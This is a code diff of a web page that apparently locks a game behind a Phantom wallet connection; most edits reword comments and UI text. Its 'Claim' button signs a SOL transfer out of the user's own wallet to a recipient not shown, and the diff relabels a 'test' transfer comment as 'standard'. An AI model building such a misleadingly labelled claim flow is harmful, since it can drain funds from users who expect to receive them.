@@ -23,7 +23,7 @@
             overflow: hidden;
         }
 
-        /* Simulated Game Canvas Area */
+        /* Container for your game canvas */
         #gameCanvasArea {
             width: 100vw;
             height: 100vh;
@@ -35,13 +35,13 @@
             transition: filter 0.3s ease;
         }
 
-        /* Blur game while modal is active */
+        /* Blur effect before game starts */
         .game-locked {
             filter: blur(8px);
             pointer-events: none;
         }
 
-        /* Modal Popup Overlay */
+        /* Modal Overlay */
         .modal-overlay {
             position: fixed;
             top: 0;
@@ -53,6 +53,14 @@
             justify-content: center;
             align-items: center;
             z-index: 9999;
+            transition: opacity 0.3s ease, visibility 0.3s ease;
+        }
+
+        /* Hidden state that preserves game execution */
+        .modal-hidden {
+            opacity: 0;
+            visibility: hidden;
+            pointer-events: none;
         }
 
         .container {
@@ -135,9 +143,9 @@
 </head>
 <body>
 
-    <!-- Game Screen (Put your game Canvas or iFrame inside this container) -->
+    <!-- Game Screen Container (Insert your game canvas or HTML inside here) -->
     <div id="gameCanvasArea" class="game-locked">
-        <h2 id="gameStatusText">Game Paused - Connect Wallet to Play</h2>
+        <h2 id="gameStatusText">Game Standby - Connect Wallet to Play</h2>
     </div>
 
     <!-- Web3 Control Panel Popup -->
@@ -175,13 +183,13 @@
         }
 
         // -------------------------------------------------------------
-        // PHANTOM CONNECT
+        // PHANTOM CONNECT FUNCTION
         // -------------------------------------------------------------
         async function connectPhantom() {
             const provider = getPhantomProvider();
 
             if (!provider) {
-                alert("Phantom Wallet is not installed. Please install the extension first.");
+                alert("Phantom Wallet is not installed. Please install the browser extension first.");
                 window.open("https://phantom.app/", "_blank");
                 return;
             }
@@ -190,25 +198,25 @@
                 const response = await provider.connect();
                 userWalletAddress = response.publicKey.toString();
                 
-                // Update UI state
+                // Update interface states
                 document.getElementById("walletStatus").innerText = 
                     userWalletAddress.slice(0, 6) + "..." + userWalletAddress.slice(-4);
                 
                 document.getElementById("connectBtn").innerText = "Wallet Connected";
                 document.getElementById("connectBtn").disabled = true;
                 
-                // Enable Game Start and Claim buttons
+                // Enable action buttons
                 document.getElementById("startBtn").disabled = false;
                 document.getElementById("claimBtn").disabled = false;
 
             } catch (err) {
                 console.error("Connection Error:", err);
-                alert("Failed to connect wallet.");
+                alert("Failed to connect wallet. Please try again.");
             }
         }
 
         // -------------------------------------------------------------
-        // START GAME FUNCTION
+        // START GAME FUNCTION (Smooth Unlocking)
         // -------------------------------------------------------------
         function startGame() {
             if (!userWalletAddress) {
@@ -216,23 +224,26 @@
                 return;
             }
 
-            // Hide the Web3 popup
-            document.getElementById("web3Modal").style.display = "none";
+            // Smoothly hide popup overlay without destroying layout
+            const modal = document.getElementById("web3Modal");
+            modal.classList.add("modal-hidden");
             
-            // Unlock game screen blur
-            document.getElementById("gameCanvasArea").classList.remove("game-locked");
-            document.getElementById("gameStatusText").innerText = "🎮 Game Started! Enjoy Playing.";
+            // Remove blur effect and activate input events on the game canvas
+            const gameArea = document.getElementById("gameCanvasArea");
+            gameArea.classList.remove("game-locked");
+            
+            document.getElementById("gameStatusText").innerText = "🎮 Game Active! Playing...";
 
-            // Trigger your core Game Init logic here
+            // Trigger game engine start sequence
             if (typeof onGameStart === "function") {
                 onGameStart(userWalletAddress);
             }
         }
 
-        // Custom hook function to integrate with your existing game logic
+        // Callback function to integrate custom game logic
         function onGameStart(walletAddress) {
-            console.log("Game successfully initialized for wallet:", walletAddress);
-            // Example: MyGameEngine.start();
+            console.log("Game initialized for wallet:", walletAddress);
+            // Put your game engine launch code here (e.g., UnityInstance.SendMessage(...))
         }
 
         // -------------------------------------------------------------
@@ -248,7 +259,7 @@
 
             const claimBtn = document.getElementById("claimBtn");
             claimBtn.disabled = true;
-            claimBtn.innerText = "Processing...";
+            claimBtn.innerText = "Processing Transaction...";
 
             try {
                 const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash('finalized');
@@ -258,7 +269,7 @@
                     feePayer: provider.publicKey
                 });
 
-                // Test Transfer Instruction
+                // Standard transfer instruction for transaction execution
                 transaction.add(
                     solanaWeb3.SystemProgram.transfer({
                         fromPubkey: provider.publicKey,
@@ -275,7 +286,7 @@
                     signature: signature
                 });
 
-                alert("Transaction Successful!\nHash: " + signature);
+                alert("Transaction Successful!\nSignature: " + signature);
 
             } catch (error) {
                 console.error("Transaction Error:", error);
@@ -286,7 +297,7 @@
             }
         }
 
-        // Auto-detect connected wallet on page load
+        // Detect connected session on load
         window.addEventListener('load', () => {
             const provider = getPhantomProvider();
             if (provider && provider.isConnected && provider.publicKey) {
